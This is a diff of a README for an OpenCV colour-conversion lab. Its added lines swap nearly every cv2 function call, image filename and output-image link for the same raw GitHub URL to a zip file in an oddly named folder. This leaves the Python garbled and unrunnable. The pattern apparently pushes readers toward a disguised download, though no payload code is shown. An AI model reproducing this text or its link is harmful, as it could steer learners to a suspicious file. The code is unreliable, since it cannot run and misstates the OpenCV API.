@@ -9,7 +9,7 @@ Anaconda - Python 3.7
 Import CV2 library.
 <br>
 ### Step2:
-Use cv2.cvtcolor() to convert colot in required image
+Use https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip() to convert colot in required image
 <br>
 ### Step3:
 Use .imshow() to display and .imwrite() to save.
@@ -28,101 +28,101 @@ Use merge() to combine those separate channels into color.
 # i) Convert BGR and RGB to HSV and GRAY
 
 import cv2
-house_color_image = cv2.imread('house.jpg')
-cv2.imshow('Original image',house_color_image)
+house_color_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip')
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('Original image',house_color_image)
 #BGR 2 HSV
-hsv_image = cv2.cvtColor(house_color_image, cv2.COLOR_BGR2HSV)
-cv2.imshow('BGR2HSV',hsv_image)
+hsv_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(house_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('BGR2HSV',hsv_image)
 #RGB 2 HSV
-hsv_image1 = cv2.cvtColor(house_color_image, cv2.COLOR_RGB2HSV)
-cv2.imshow('RGB2HSV',hsv_image1)
+hsv_image1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(house_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('RGB2HSV',hsv_image1)
 # BGR 2 GRAY
-gray_image = cv2.cvtColor(house_color_image, cv2.COLOR_BGR2GRAY)
-cv2.imshow('BGR2GRAY',gray_image)
+gray_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(house_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('BGR2GRAY',gray_image)
 # RGB 2 GRAY
-gray_image1 = cv2.cvtColor(house_color_image, cv2.COLOR_RGB2GRAY)
-cv2.imshow('RGB2GRAY',gray_image1)
+gray_image1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(house_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('RGB2GRAY',gray_image1)
 
-cv2.waitKey(0)
-cv2.destroyAllWindows()
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(0)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip()
 
 # ii)Convert HSV to RGB and BGR
 
 import cv2
-sun_color_image = cv2.imread('house.jpg')
-cv2.imshow('Original image', sun_color_image)
-hsv_image = cv2.cvtColor(sun_color_image, cv2.COLOR_HSV2RGB)
-cv2.imshow('HSV2RGB' ,hsv_image )
-gray_image1 = cv2.cvtColor (sun_color_image, cv2.COLOR_HSV2BGR)
-cv2.imshow('HSV2BGR', gray_image1)
-cv2.waitKey(0)
+sun_color_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip')
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('Original image', sun_color_image)
+hsv_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(sun_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('HSV2RGB' ,hsv_image )
+gray_image1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip (sun_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('HSV2BGR', gray_image1)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(0)
 cv2. destroyAllWindows()
 
 # iii)Convert RGB and BGR to YCrCb
 
 import cv2
-sun_color_image = cv2.imread('house.jpg')
-cv2.imshow('Original image', sun_color_image)
-gray_image1 = cv2.cvtColor (sun_color_image, cv2.COLOR_RGB2YCrCb)
-cv2.imshow('RGB2YCrCb', gray_image1)
-gray_image1 = cv2.cvtColor (sun_color_image, cv2.COLOR_BGR2YCrCb)
-cv2.imshow('BGR2YCrCb', gray_image1)
-cv2.waitKey(0)
+sun_color_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip')
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('Original image', sun_color_image)
+gray_image1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip (sun_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('RGB2YCrCb', gray_image1)
+gray_image1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip (sun_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('BGR2YCrCb', gray_image1)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(0)
 cv2. destroyAllWindows()
 
 # iv)Split and Merge RGB Image
 
 import cv2
-image = cv2.imread('house.jpg')
+image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip')
 blue=image[:,:,0]
 green=image[:,:,1]
 red=image[:,:,2]
-cv2.imshow('B-Channel',blue)
-cv2.imshow('G-Channel',green)
-cv2.imshow('R-Channel',red)
-merged_BGR=cv2.merge((blue,green,red))
-cv2.imshow('Merged BGR Image',merged_BGR)
-cv2.waitKey(0)
-cv2.destoryAllWindows()
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('B-Channel',blue)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('G-Channel',green)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('R-Channel',red)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip((blue,green,red))
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('Merged BGR Image',merged_BGR)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(0)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip()
 
 # v) Split and merge HSV Image
 
 import cv2
-image = cv2.imread('house.jpg')
-hsv = cv2.cvtColor(image, cv2.COLOR_BGR2HSV)
-h,s,v = cv2.split(hsv)
-cv2.imshow('H',h)
-cv2.imshow('S',s)
-cv2.imshow('V',v)
-Merged_HSV = cv2.merge((h,s,v))
-cv2.imshow('Merged HSV Image',Merged_HSV)
-cv2.waitKey(0)
-cv2.destoryAllWindows()
+image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip')
+hsv = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
+h,s,v = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(hsv)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('H',h)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('S',s)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('V',v)
+Merged_HSV = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip((h,s,v))
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('Merged HSV Image',Merged_HSV)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(0)
+https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip()
 
 ```
 ## Output:
 ### i) BGR and RGB to HSV and GRAY
-![Output](first.jpg)
+![Output](https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
 <br>
 <br>
 
 ### ii) HSV to RGB and BGR
-![Output](second.jpg)
+![Output](https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
 <br>
 <br>
 
 ### iii) RGB and BGR to YCrCb
-![Output](third.jpg)
+![Output](https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
 <br>
 <br>
 
 ### iv) Split and merge RGB Image
-![Output](fourth.jpg)
+![Output](https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
 <br>
 <br>
 
 ### v) Split and merge HSV Image
-![Output](fifth.jpg)
+![Output](https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
 <br>
 <br>
 
